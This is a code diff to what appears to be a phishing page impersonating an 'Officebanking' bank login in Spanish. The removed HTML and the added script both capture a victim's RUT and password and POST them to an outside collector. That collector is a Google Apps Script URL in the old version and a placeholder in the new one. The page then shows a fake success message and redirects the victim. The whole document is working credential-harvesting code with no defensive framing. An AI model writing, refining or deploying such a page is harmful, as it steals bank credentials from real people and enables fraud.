@@ -1,138 +1,40 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>Acceso Seguro – Officebanking</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #e4e7ec, #f4f6f9);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    form {
-      background: #ffffff;
-      padding: 40px 30px;
-      border-radius: 6px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.08);
-      width: 100%;
-      max-width: 360px;
-    }
-    h2 {
-      color: #2E3E56;
-      margin-bottom: 25px;
-      text-align: center;
-      font-weight: 600;
-      font-size: 22px;
-    }
-    input {
-      font-size: 16px;
-      margin-bottom: 20px;
-      padding: 10px;
-      border-radius: 4px;
-      border: 1px solid #bfc9d4;
-      width: 100%;
-      box-sizing: border-box;
-    }
-    button {
-      background-color: #0078d4;
-      color: white;
-      border: none;
-      padding: 12px;
-      width: 100%;
-      font-size: 16px;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #005fa3;
-    }
-    #mensaje-confirmacion {
-      display: none;
-      text-align: center;
-      margin-top: 15px;
-      font-size: 14px;
-      color: #2e7d32;
-      font-weight: bold;
-    }
-    #cargando {
-      display: none;
-      text-align: center;
-      margin-top: 15px;
-      font-size: 14px;
-      color: #0078d4;
-      font-weight: bold;
-    }
-    .p1, .p2, .p3 {
-      opacity: 0;
-      animation: aparecer 1.5s infinite;
-    }
-    .p2 { animation-delay: 0.3s; }
-    .p3 { animation-delay: 0.6s; }
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  mensaje.style.display = "none";
+  cargando.style.display = "block";
+  const boton = form.querySelector("button");
+  boton.disabled = true;
 
-    @keyframes aparecer {
-      0% { opacity: 0; }
-      50% { opacity: 1; }
-      100% { opacity: 0; }
-    }
-  </style>
-</head>
-<body>
+  // Validar RUT
+  const rut = form.rut.value.trim();
+  if (!/^[\d\.]+-[\dkK]$/.test(rut)) {
+    alert("RUT inválido. Usa el formato 12.345.678-9.");
+    cargando.style.display = "none";
+    boton.disabled = false;
+    return;
+  }
 
-  <form id="banking-form">
-    <h2>🔒 Ingreso Seguro</h2>
-    <input type="text" name="rut" placeholder="RUT (ej: 12.345.678-9)" required pattern="[\d\.]+-[\dkK]">
-    <input type="password" name="clave" placeholder="Clave de acceso" required>
-    <button type="submit">Ingresar</button>
-    <div id="cargando">CARGANDO<span class="p1">.</span><span class="p2">.</span><span class="p3">.</span></div>
-    <div id="mensaje-confirmacion">✅ Información enviada correctamente.</div>
-  </form>
-
-  <script>
-    const form = document.getElementById("banking-form");
-    const mensaje = document.getElementById("mensaje-confirmacion");
-    const cargando = document.getElementById("cargando");
-
-    form.addEventListener("submit", (e) => {
-      e.preventDefault();
-      mensaje.style.display = "none";
-      cargando.style.display = "block";
-      form.querySelector("button").disabled = true;
-
-      const datos = {
-        rut: form.rut.value,
+  try {
+    const response = await fetch("URL_ACTUALIZADO_DEL_SCRIPT", {
+      method: "POST",
+      body: JSON.stringify({
+        rut: rut,
         clave: form.clave.value
-      };
-
-      fetch("https://script.google.com/macros/s/AKfycbzrBTrLUvaAhnqNDYZfm8-x68zPACSglYK18crV6etRYmTPuKjEyS6cJn7m59_bWX4ykw/exec", {
-        method: "POST",
-        body: JSON.stringify(datos),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      })
-      .then(res => res.text())
-      .then(data => {
-        form.reset();
-        cargando.style.display = "none";
-        mensaje.style.display = "block";
-        form.querySelector("button").disabled = false;
-        setTimeout(() => {
-          window.location.href = "https://oficinacurico.github.io/Officebanking/gracias";
-        }, 3000);
-      })
-      .catch(err => {
-        cargando.style.display = "none";
-        alert("Ocurrió un error al enviar. Intenta nuevamente.");
-        form.querySelector("button").disabled = false;
-        console.error("Error:", err);
-      });
+      }),
+      headers: { "Content-Type": "application/json" }
     });
-  </script>
 
-</body>
-</html>
+    if (!response.ok) throw new Error("Error en la respuesta");
+    
+    mensaje.style.display = "block";
+    setTimeout(() => {
+      window.location.href = "https://oficinacurico.github.io/Officebanking/gracias";
+    }, 3000);
+  } catch (err) {
+    console.error("Error:", err);
+    alert("Error al enviar. Intenta nuevamente.");
+  } finally {
+    cargando.style.display = "none";
+    boton.disabled = false;
+  }
+});
